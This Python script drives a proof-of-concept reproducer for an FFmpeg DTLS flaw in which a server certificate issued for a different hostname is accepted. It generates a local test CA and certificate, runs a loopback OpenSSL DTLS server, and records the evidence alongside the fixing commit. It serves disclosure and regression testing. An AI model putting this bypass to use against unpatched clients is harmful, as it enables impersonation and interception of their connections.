"""Build and record OpenSSL DTLS hostname peer-identity bypass."""

from __future__ import annotations

import argparse
import hashlib
import json
import platform
import shutil
import socket
import subprocess
import tempfile
import time
from datetime import UTC, datetime
from pathlib import Path

SCHEMA_VERSION = "cw.ffmpeg.dtls-openssl-hostname-verify-reproducer.v1"
REPAIR_COMMIT = "e2eee22f16744a2f60b9c0b46077478c2592bb70"


def _arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--checkout", type=Path, required=True)
    parser.add_argument(
        "--harness",
        type=Path,
        default=Path(__file__).with_name(
            "ffmpeg_dtls_openssl_hostname_verify_reproducer.c"
        ),
    )
    parser.add_argument("--binary-output", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args()


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def _openssl_flags() -> list[str]:
    result = subprocess.run(
        ["pkg-config", "--libs", "openssl"],
        check=True,
        capture_output=True,
        text=True,
    )
    return result.stdout.split()


def _compile_command(harness: Path, binary: Path) -> list[str]:
    command = [
        "clang",
        "-I.",
        "-D_ISOC11_SOURCE",
        "-D_FILE_OFFSET_BITS=64",
        "-D_LARGEFILE_SOURCE",
        "-I./compat/dispatch_semaphore",
        "-DPIC",
        "-I./compat/stdbit",
        "-DZLIB_CONST",
        "-DHAVE_AV_CONFIG_H",
        "-fno-omit-frame-pointer",
        "-g",
        "-O1",
        "-std=c17",
        "-fPIC",
        "-o",
        str(binary),
        str(harness),
        "-Llibavformat",
        "-Llibavcodec",
        "-Llibavutil",
        "-lavformat",
        "-lavcodec",
        "-lavutil",
        *_openssl_flags(),
        "-lm",
    ]
    if platform.system() == "Darwin":
        command.extend(
            [
                "-framework",
                "CoreFoundation",
                "-framework",
                "Security",
                "-liconv",
            ]
        )
    command.append("-pthread")
    return command


def _run(command: list[str], cwd: Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        command,
        cwd=cwd,
        check=False,
        capture_output=True,
        text=True,
        timeout=20,
    )


def _generate_certificates(
    openssl: str, directory: Path
) -> tuple[Path, Path, Path, list[dict[str, object]]]:
    ca_key = directory / "ca-key.pem"
    ca_cert = directory / "ca-cert.pem"
    server_key = directory / "server-key.pem"
    server_request = directory / "server.csr"
    server_cert = directory / "server-cert.pem"
    commands = [
        [
            openssl,
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-keyout",
            str(ca_key),
            "-out",
            str(ca_cert),
            "-days",
            "1",
            "-subj",
            "/CN=Clearwing Test CA",
        ],
        [
            openssl,
            "req",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-keyout",
            str(server_key),
            "-out",
            str(server_request),
            "-subj",
            "/CN=wrong.example",
        ],
        [
            openssl,
            "x509",
            "-req",
            "-in",
            str(server_request),
            "-CA",
            str(ca_cert),
            "-CAkey",
            str(ca_key),
            "-CAcreateserial",
            "-out",
            str(server_cert),
            "-days",
            "1",
            "-sha256",
        ],
    ]
    records: list[dict[str, object]] = []
    for command in commands:
        result = _run(command, directory)
        records.append(
            {
                "command": command,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
            }
        )
        if result.returncode != 0:
            break
    return ca_cert, server_key, server_cert, records


def _unused_udp_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])


def main() -> None:
    args = _arguments()
    checkout = args.checkout.expanduser().resolve()
    harness = args.harness.expanduser().resolve()
    binary = args.binary_output.expanduser().resolve()
    output = args.output.expanduser().resolve()
    source = checkout / "libavformat/tls_openssl.c"
    components = checkout / "config_components.h"
    config = checkout / "config.h"
    openssl = shutil.which("openssl")
    if (
        not harness.is_file()
        or not source.is_file()
        or not components.is_file()
        or not config.is_file()
        or not openssl
        or not (checkout / "libavformat/libavformat.a").is_file()
    ):
        raise ValueError(
            "harness, OpenSSL, DTLS source/configuration, and archives must exist"
        )

    binary.parent.mkdir(parents=True, exist_ok=True)
    output.parent.mkdir(parents=True, exist_ok=True)
    compile_command = _compile_command(harness, binary)
    compile_result = _run(compile_command, checkout)
    certificate_records: list[dict[str, object]] = []
    chain_result = subprocess.CompletedProcess([], 127, "", "not run")
    identity_result = subprocess.CompletedProcess([], 127, "", "not run")
    run_result = subprocess.CompletedProcess([str(binary)], 127, "", "not run")
    server_command: list[str] | None = None
    server_stdout = ""
    server_stderr = ""
    server_returncode: int | None = None
    server_cert_sha256: str | None = None

    if compile_result.returncode == 0:
        with tempfile.TemporaryDirectory(
            prefix="clearwing-dtls-hostname-"
        ) as temporary:
            certificate_dir = Path(temporary)
            ca_cert, server_key, server_cert, certificate_records = (
                _generate_certificates(openssl, certificate_dir)
            )
            if all(record["returncode"] == 0 for record in certificate_records):
                server_cert_sha256 = _sha256(server_cert)
                chain_result = _run(
                    [
                        openssl,
                        "verify",
                        "-CAfile",
                        str(ca_cert),
                        str(server_cert),
                    ],
                    certificate_dir,
                )
                identity_result = _run(
                    [
                        openssl,
                        "verify",
                        "-CAfile",
                        str(ca_cert),
                        "-verify_hostname",
                        "localhost",
                        str(server_cert),
                    ],
                    certificate_dir,
                )
                port = _unused_udp_port()
                server_command = [
                    openssl,
                    "s_server",
                    "-dtls",
                    "-listen",
                    "-quiet",
                    "-accept",
                    str(port),
                    "-cert",
                    str(server_cert),
                    "-key",
                    str(server_key),
                    "-naccept",
                    "1",
                ]
                server = subprocess.Popen(
                    server_command,
                    cwd=certificate_dir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
                try:
                    time.sleep(0.25)
                    if server.poll() is None:
                        run_result = _run(
                            [str(binary), str(port), str(ca_cert)], checkout
                        )
                finally:
                    if server.poll() is None:
                        server.terminate()
                    try:
                        server_stdout, server_stderr = server.communicate(timeout=3)
                    except subprocess.TimeoutExpired:
                        server.kill()
                        server_stdout, server_stderr = server.communicate(timeout=3)
                    server_returncode = server.returncode

    source_text = source.read_text(encoding="utf-8", errors="replace")
    configured_components = components.read_text(
        encoding="utf-8", errors="replace"
    )
    configured_features = config.read_text(encoding="utf-8", errors="replace")
    dtls_start = source_text.split("static int dtls_start", 1)[-1].split(
        "static int tls_open", 1
    )[0]
    repair_result = subprocess.run(
        [
            "git",
            "show",
            "--format=fuller",
            "--no-ext-diff",
            REPAIR_COMMIT,
            "--",
            "libavformat/tls_openssl.c",
        ],
        cwd=checkout,
        check=False,
        capture_output=True,
        text=True,
    )
    repair_text = repair_result.stdout + repair_result.stderr
    repair_source_result = subprocess.run(
        [
            "git",
            "show",
            f"{REPAIR_COMMIT}:libavformat/tls_openssl.c",
        ],
        cwd=checkout,
        check=False,
        capture_output=True,
        text=True,
    )
    repair_source = repair_source_result.stdout
    source_indicators = {
        "openssl_enabled": "#define CONFIG_OPENSSL 1" in configured_features,
        "dtls_protocol_enabled": (
            "#define CONFIG_DTLS_PROTOCOL 1" in configured_components
        ),
        "verify_enables_chain_validation": (
            "if (s->verify)\n        SSL_CTX_set_verify" in dtls_start
        ),
        "dtls_hostname_identity_missing": (
            "doesn't check that the peer certificate actually matches"
            in dtls_start
            and "SSL_set1_host" not in dtls_start
            and "SSL_set_tlsext_host_name" in dtls_start
        ),
        "exact_repair_present": (
            repair_result.returncode == 0
            and repair_source_result.returncode == 0
            and "refactor dtls_start() to use common code" in repair_text
            and "return tls_open(h, uri, flags, options);" in repair_text
            and "SSL_set1_host(c->ssl, s->host)" in repair_source
        ),
    }
    combined = run_result.stdout + run_result.stderr
    runtime_indicators = {
        "public_hostname_dtls_url": (
            "protocol=dtls target=localhost verify=1" in combined
        ),
        "certificate_chain_is_trusted": chain_result.returncode == 0,
        "certificate_fails_hostname_identity": (
            identity_result.returncode != 0
            and "hostname mismatch"
            in (identity_result.stdout + identity_result.stderr).lower()
        ),
        "ffmpeg_accepted_wrong_identity": (
            "vulnerable_dtls_hostname_connection_accepted=1" in combined
            and run_result.returncode == 0
        ),
    }
    expected_observed = (
        compile_result.returncode == 0
        and all(source_indicators.values())
        and all(runtime_indicators.values())
    )
    commit_result = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=checkout,
        check=False,
        capture_output=True,
        text=True,
    )
    payload = {
        "schema_version": SCHEMA_VERSION,
        "completed_at": datetime.now(UTC).isoformat(),
        "checkout": str(checkout),
        "checkout_commit": commit_result.stdout.strip() or None,
        "harness": str(harness),
        "harness_sha256": _sha256(harness),
        "binary": str(binary),
        "binary_sha256": _sha256(binary) if binary.is_file() else None,
        "source_sha256": _sha256(source),
        "compile_command": compile_command,
        "compile_returncode": compile_result.returncode,
        "compile_stdout": compile_result.stdout,
        "compile_stderr": compile_result.stderr,
        "certificate_generation": certificate_records,
        "server_certificate_sha256": server_cert_sha256,
        "chain_verify_returncode": chain_result.returncode,
        "chain_verify_stdout": chain_result.stdout,
        "chain_verify_stderr": chain_result.stderr,
        "hostname_verify_returncode": identity_result.returncode,
        "hostname_verify_stdout": identity_result.stdout,
        "hostname_verify_stderr": identity_result.stderr,
        "server_command": server_command,
        "server_returncode": server_returncode,
        "server_stdout": server_stdout,
        "server_stderr": server_stderr,
        "run_command": run_result.args,
        "returncode": run_result.returncode,
        "source_indicators": source_indicators,
        "runtime_indicators": runtime_indicators,
        "repair_commit": REPAIR_COMMIT,
        "repair_commit_output": repair_result.stdout,
        "repair_source_sha256": (
            hashlib.sha256(repair_source.encode()).hexdigest()
            if repair_source_result.returncode == 0
            else None
        ),
        "expected_observed": expected_observed,
        "scope": (
            "A locally trusted CA signs a server certificate only for "
            "wrong.example. OpenSSL independently accepts the chain and "
            "rejects that certificate for localhost. FFmpeg's public DTLS "
            "URL with verify=1 nevertheless completes the hostname connection "
            "because the vulnerable DTLS path installs SNI but no identity "
            "target."
        ),
        "stdout": run_result.stdout,
        "stderr": run_result.stderr,
    }
    temporary = output.with_suffix(output.suffix + ".tmp")
    temporary.write_text(
        json.dumps(payload, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    temporary.replace(output)
    print(output)
    if not expected_observed:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
